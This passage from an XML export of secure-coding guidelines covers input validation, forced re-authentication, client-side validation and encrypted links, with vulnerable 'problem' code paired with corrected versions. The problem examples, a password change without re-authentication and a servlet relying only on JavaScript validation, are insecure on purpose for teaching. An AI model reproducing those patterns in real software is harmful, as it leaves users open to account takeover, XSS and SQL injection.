 which could cause a middle layer string parser to crash, allow for format string attacks, SQL injection, or a host of other issues.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;In the following code, a page accepts a query string parameter called isbn. The value of this variable is used to look up a book in the database using an unmanaged middle layer. The code uses regular expressions to validate the query string string value.
 This ensures that the value supplied by the client is in the correct format by checking the length of the string and the characters used.&lt;/p&gt;
&lt;pre&gt;&amp;lt;script language=&amp;quot;C#&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;    protected void Page_Load(object sender, EventArgs e)&lt;br&gt;    {&lt;br&gt;        String strIsbn = this.Request.QueryString[&amp;quot;isbn&amp;quot;];&lt;br&gt;        if (Regex.IsMatch((strIsbn), @&amp;quot;(?=.{13}$)\d{1,5}([- ])\d{1,7}\1\d{1,6}\1(\d|X)$&amp;quot;))&lt;br&gt;        {&lt;br&gt;            //lookup isbn in a database using an&lt;br&gt;            //unamanged middle layer&lt;br&gt;        }&lt;br&gt;        else&lt;br&gt;        {&lt;br&gt;            //display error&lt;br&gt;        }&lt;br&gt;    }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:897EEB0A-23C9-4699-A400-925FFC32C11E"&gt;Guideline: Filter All User-Supplied Filename and Path Input
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1AB38C50-F31D-4CD8-89B1-CE397E6895E8"&gt;Guideline: Encode All Output Data
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:58F9B51D-794F-4CFC-B568-7F5E55DEB402"&gt;Guideline: Do Not Rely on Client-Side Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:F1B74837-9A72-4745-A149-EC5D8C476EB7"&gt;Guideline: Validate All Input Passed to Database
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:C79CF3EA-F8D7-45D7-A3C5-6370411E500D"&gt;Guideline: Validate User's Login Credentials Before Processing Them
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:76CC3214-9D3A-4568-B3CB-9E2AEAE560A0"&gt;Checklist Item: Input from All Sources is Validated
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>cdddefd7-2197-48f1-b21e-20c7731c8df2</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Force Re-authentication When Executing Critical Functionality</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;Applications written using Servlets or JSP.&lt;/p&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Force the user to re-authenticate when executing security-critical functionality including, but not limited to, change of password, account modifications and critical transactions.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Forcing the user to re-authenticate verifies the user's decision to execute the given functionality and preserves the application's integrity in the event that a user's account has been compromised via session hijacking.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Force re-authentication prior to executing security-critical functionality.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Follow these steps when forcing re-authentication:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify critical functionality.&lt;/strong&gt; Evaluate your application's design and requirements and determine what parts and resources of your application are very important to your organization's business model or your application's security architecture.
 This could include activities such as financial transactions or resetting user passwords.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Adopt re-authentication mechanism.&lt;/strong&gt; Establish a mechanism that requires the user to verify their authenticity:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Current password.&lt;/strong&gt; The user uses their current password to confirm the identity. This technique ensures that the given user is aware of the action to be performed and holds responsibility for executing it.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CAPTCHA.&lt;/strong&gt; CAPTCHA are mechanisms designed to ensure that a human, not an automated script, is using the system. Using a CAPTCHA should be seen as a way of augmenting a password in this kind of situation, not a way of replacing it. Many CAPTCHA
 systems embed distorted letters or numbers into displayed images which the user must enter. There are a number of problems with many CAPTCHA systems, so they should not be relied on too heavily. First, many graphical CAPTCHAs can be trivially broken by optical
 character recognition systems, and ensuring that a CAPTCHA is sufficiently strong to be useful without having too high of a failure rate for real users is difficult. If CAPTCHAs are reused, the attacker can simply record the session IDs of CAPTCHAs with known
 values and replay them. CAPTCHAs can also be broken by using a man-in-the-middle technique where the image is saved and forwarded to another site controlled by the attacker. An unsuspecting user of that site solves the CAPTCHA and the attacker forwards the
 answer to the victim site. CAPTCHAs also create accessibility problems for users, as blind and sometimes even color-blind individuals can find them impossible. If you choose to implement a CAPTCHA, be aware of the trade-offs involved and ensure that the system
 you use is appropriately protected against the attacks you expect to see.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Enforce the re-authentication mechanism.&lt;/strong&gt; Once the critical functionality is identified and the re-authentication mechanism is established, enforce the re-authentication mechanism before all security-critical actions.&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code allows a user to change their credentials. Unfortunately, the code enters the new credentials into the credentials repository without verifying that it is the actual user changing the credentials.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean changePassword(String user, char[] oldPass, char[] newPass)&lt;br&gt;{&lt;br&gt;       // The application fails to re-authenticate the user&lt;br&gt;       // Verify that new password meets password requirements&lt;br&gt;       // Update the credential store with the new password&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code allows a user to change their credentials. Before entering the new credentials into the credentials repository, the code verifies that it is the actual user doing the credentials change.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean changePassword(String user, char[] oldPass, char[] newPass)&lt;br&gt;{&lt;br&gt;       // The application forces re-authentication&lt;br&gt;      if(!validateUser(user, oldPass))&lt;br&gt;      {&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;       // Verify that new password meets password requirements&lt;br&gt;       // Update the credential store with the new password&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To read more about authentication best practices, see: &lt;a href="http://www.owasp.org/index.php/Guide_to_Authentication"&gt;
Guide to Authentication&lt;/a&gt; available from OWASP. &lt;/li&gt;&lt;li&gt;For more information on CAPTCHA, see: &lt;a href="http://en.wikipedia.org/wiki/Captcha"&gt;
CAPTCHA&lt;/a&gt; in Wikipedia and the &lt;a href="http://www.captcha.net/"&gt;official site&lt;/a&gt; for CAPTCHA.
&lt;/li&gt;&lt;li&gt;To learn more about the challenges of implementing CAPTCHA and the approaches to resolve them, see:
&lt;a href="http://www.15seconds.com/issue/040202.htm"&gt;Fighting Spambots with .NET and AI&lt;/a&gt; and
&lt;a href="http://www.pcmag.com/article2/0,4149,1306805,00.asp"&gt;CAPTCHA-ing the Spammer&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:31529619-FB94-4798-BB29-14AC389F2240"&gt;Guideline: Separate Account Administration from the Main Application Interface (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3EB8979E-59F0-4C2B-8D8A-CFB173E5D66B"&gt;Attack: HTTP Session Hijacking Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5A2A3106-5532-4CC5-BB2B-0EE25ADD8A19"&gt;Checklist Item: Re-authentication is Enforced When Executing Critical Functionality (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ce57bd55-7f7b-42b5-b7b0-59db156f2b94</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL or IPSec for Secure Communication Between Entities</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use an encrypted communication channel to protect data sent between servers. SSL and IPSec can both be used under different circumstances to protect the communication traffic between servers.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Servers may not necessarily co-exist in a secure environment. If the communication between&amp;nbsp;two or more servers&amp;nbsp;is not protected, the data sent between them could be compromised via eavesdropping or data manipulation.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your servers are not inside a physically secure data center where the network eavesdropping threat is considered insignificant.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Determine the level of desired granularity for the given server/application suite. If the protection needs to be applied across all applications, use IPSec. If the protection is granular and only a certain portion of the information exchanged between servers
 is sensitive use SSL. SSL and IPSec can both be used to help protect communication between servers by encrypting traffic. There are benefits to using a mixed approach consisting of both SSL and IPSec. See the related guidelines for specific details.
&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;How To: Use IPSec to Provide Secure Communication Between Two Servers&amp;nbsp;&lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp"&gt;http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;How To: Use SSL to Secure Communication with SQL Server&amp;nbsp;&lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp"&gt;http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;How To: Use IPSec for Filtering Ports and Authentication &lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp"&gt;
http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;How To: Use IPSec Policy to Secure Terminal Services Communications in Windows Server 2003
&lt;a href="http://support.microsoft.com/kb/816521"&gt;http://support.microsoft.com/kb/816521&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;Using Secure Sockets Layer &lt;a href="http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Internet Protocol Version 6 &lt;a href="http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx"&gt;
http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:ecfc4c67-2a6c-443e-844e-8a3051fe54f3"&gt;Use IPSsec to Encrypt Traffic Between Servers&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8afce3ed-b29f-4a25-ab8c-0d070383c7ad"&gt;Use SSL Between Untrusted Server Applications&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:0c3fe1a1-c49c-4187-872e-246e07c875f9"&gt;For Communication Between Web Browser and Web Server, SSL is used When Pages Need to be Encrypted&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>cfb27b01-2baa-476e-8d80-207548c6facc</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Do Not Rely on Client-Side Validation</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;Applications written using Servlets or JSP.&lt;/p&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Avoid placing the validation procedures only on the client side. All input should be validated server side.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Client-side validation is executed by the client and can be easily bypassed. Client-side validation is a major design problem when it appears in web applications. It places trust in the browser, an entity that should never be trusted.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application accepts input from the client, always validate for length, range and type on the server.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Client-side validation should only be used to improve user experience, never for security purposes. A client-side input validation check can improve application performance by catching malformed input on the client and, therefore, saving a roundtrip to the
 server. However, client side validation can be easily bypassed and should never be used for security purposes. Always use server-side validation to protect your application from malicious attacks.&lt;/p&gt;
&lt;p&gt;Use the following steps when developing client side validation: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Never trust the browser.&lt;/strong&gt; Because the browser is running on the user's machine, it can be fully controlled by the user. Therefore, any client-side validation code can be controlled and bypassed by an attacker.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use JavaScript only to enhance your pages.&lt;/strong&gt; JavaScript is useful for enhancing your application's presentation. However, it has no mechanism to protect the integrity of its code. Do not rely on JavaScript to enforce security decisions.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Place a server-side validator for all input. &lt;/strong&gt;Input validation should be executed on the server side. Use the following steps to properly set the validation routines:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify input.&lt;/strong&gt; Determine the data that is to be passed from the client to your application. Input can take the following forms on the client-side:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL-based parameters &lt;/li&gt;&lt;li&gt;Form-based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Understand the input.&lt;/strong&gt; Understand the use and constraints associated with each input. Be clear how each input is used. Define the format and type of each input. Build a server-side validator for each format and type of expected input.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a set of validators.&lt;/strong&gt; Build a validator for each type of input. Place the set of validators on the server-side of your application. If there are validators on the client-side, make sure the same validators are implemented on the server-side
 as well. Consult the &lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;
Validate Input from All Sources&lt;/a&gt; and &lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;
Validate Input for Length, Range, Format, and Type&lt;/a&gt; guidelines about creating the validators.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Once developed, it is important to place the validation routines at your application's trust boundary. Because your application's trust boundary extends only to your application's process space, the user's browser should not be considered&amp;nbsp;a part of your
 application's trust boundary.&lt;/p&gt;
&lt;p&gt;Example of correctly set validation:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;%-- Filename: sample.jsp --%&amp;gt;&lt;br&gt;&amp;lt;%boolean validateJSP(String input)&lt;br&gt;{&lt;br&gt;      // Validation routine&lt;br&gt;}&lt;br&gt;String idx = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;if(idx != null &amp;amp;&amp;amp; validateJSP(idx))&lt;br&gt;{&lt;br&gt;      ...&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;      //Display a generic error message (e.g. &amp;quot;Invalid query.&amp;quot;)&lt;br&gt;}&lt;br&gt;%&amp;gt;&lt;br&gt; ...&lt;br&gt;&amp;lt;form method=&amp;quot;post&amp;quot; action=&amp;quot;sample.jsp&amp;quot;&amp;gt;&lt;br&gt;  &amp;lt;input name=&amp;quot;index&amp;quot; type=&amp;quot;text&amp;quot; size=&amp;quot;50&amp;quot;&amp;gt;&lt;br&gt;  &amp;lt;input name=&amp;quot;submit&amp;quot; value=&amp;quot;submit&amp;quot; type=&amp;quot;submit&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Unfortunately, the user's input is validated only on the client side via a JavaScript routine. Since there is no validation on the server, an attacker can bypass all validation and exploit
 cross-site scripting and SQL injection vulnerabilities.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;!-- Filename: idv01.html --&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;!-- The page uses client-side validation only --&amp;gt;&lt;br&gt;    &amp;lt;script language=&amp;quot;JavaScript&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;!--function validate()&lt;br&gt;{&lt;br&gt;   var idx = document.forms[0].elements[0].value;&lt;br&gt;   var regex = new RegExp(&amp;quot;[a-zA-Z0-9]&amp;#43;&amp;quot;);&lt;br&gt;   var match = regex.exec(idx);&lt;br&gt;   var ret = false;&lt;br&gt;    if(idx.length &amp;lt; 9 &amp;amp;&amp;amp; match != null)&lt;br&gt;    {&lt;br&gt;      ret = true;&lt;br&gt;    }&lt;br&gt;   else&lt;br&gt;   {&lt;br&gt;      alert(&amp;quot;Invalid index!&amp;quot;);&lt;br&gt;   }&lt;br&gt;    return ret;&lt;br&gt;}&lt;br&gt;// --&amp;gt;&lt;br&gt;    &amp;lt;/script&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;Query for index&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;!-- The application relies on client side validation --&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;post&amp;quot; action=&amp;quot;/myapp/aggregate&amp;quot; onsubmit=&amp;quot;return validate()&amp;quot;&amp;gt;&lt;br&gt;      index:&amp;amp;nbsp;&amp;lt;input name=&amp;quot;index&amp;quot; type=&amp;quot;text&amp;quot; size=&amp;quot;10&amp;quot;&amp;gt;&lt;br&gt;      &amp;lt;input name=&amp;quot;submit&amp;quot; value=&amp;quot;query&amp;quot; type=&amp;quot;submit&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;// Filename: /myapp/aggregate&lt;br&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  String retString;&lt;br&gt;                  retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                  retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                  retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                  out.println(retString);&lt;br&gt;                   // The application does not provide a server-side validation&lt;br&gt;                  aggregateData(out, searchTerm);&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling&lt;br&gt;                  // mechanisms. Consult the Exception Handling and&lt;br&gt;                  // Logging sections&lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43;  &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Because the application uses server-side validation, it is impossible for an attacker to bypass the validation routines and exploit any cross-site scripting and/or SQL injection vulnerabilities.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;!-- Filename: idv01.html --&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;!-- The page uses server-side validation only --&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;Query for index&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;!-- The application uses no client-side validation --&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;post&amp;quot; action=&amp;quot;/myapp/aggregate&amp;quot;&amp;gt;&lt;br&gt;      index:&amp;amp;nbsp;&amp;lt;input name=&amp;quot;index&amp;quot; type=&amp;quot;text&amp;quot; size=&amp;quot;10&amp;quot;&amp;gt;&lt;br&gt;      &amp;lt;input name=&amp;quot;submit&amp;quot; value=&amp;quot;query&amp;quot; type=&amp;quot;submit&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;// Filename: /myapp/aggregate&lt;br&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  // The application uses only server-side validation&lt;br&gt;                  if (validateSearchTerm(searchTerm))&lt;br&gt;                  {&lt;br&gt;                        String retString;&lt;br&gt;                        retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                        retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                        retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                        out.println(retString);&lt;br&gt;                        aggregateData(out, searchTerm);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add the appropriate logging and exception handling&lt;br&gt;                        // mechanisms. Consult the Exception Handling and&lt;br&gt;                        // Logging sections&lt;br&gt;                        out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                 &amp;#43;  &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;            catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling&lt;br&gt;                  // mechanisms. Consult the Exception Handling and&lt;br&gt;                  // Logging sections&lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43;  &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;             out.close();&lt;br&gt;      }&lt;br&gt;       boolean validateSearchTerm(String input)&lt;br&gt;      {&lt;br&gt;            String goodPattern = &amp;quot;(\\w|\\d)&amp;#43;&amp;quot;;&lt;br&gt;            int goodLength = 8;&lt;br&gt;             if (input == null)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;             if(input.length() &amp;gt; goodLength)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        Pattern p = Pattern.compile(goodPattern);&lt;br&gt;            Matcher m = p.matcher(input);&lt;br&gt;                        if(!m.matches())&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        return true;&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;Guideline: Validate Input from All Sources (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F"&gt;Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF"&gt;Attack: Client-side Validation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D089D9CA-860C-4F98-BC7E-5AD7553DB6DD"&gt;Checklist Item: Client-Side Validation is Not Relied On (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>dbdd2fbe-4ecb-4bf5-9272-5f244ea26663</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt Communication Links</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;Applications written using Servlets or JSP.&lt;/p&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Encrypt the communication channels when interacting with other software across the network.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Encrypting the communication links allows the application to preserve the confidentiality and integrity of the transmitted data.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If sensitive data must be transmitted between two hosts, either&amp;nbsp;between servers or between application and server, then encrypt the communication links.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To encrypt the communication links:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the connections used for transmitting sensitive data. &lt;/strong&gt;
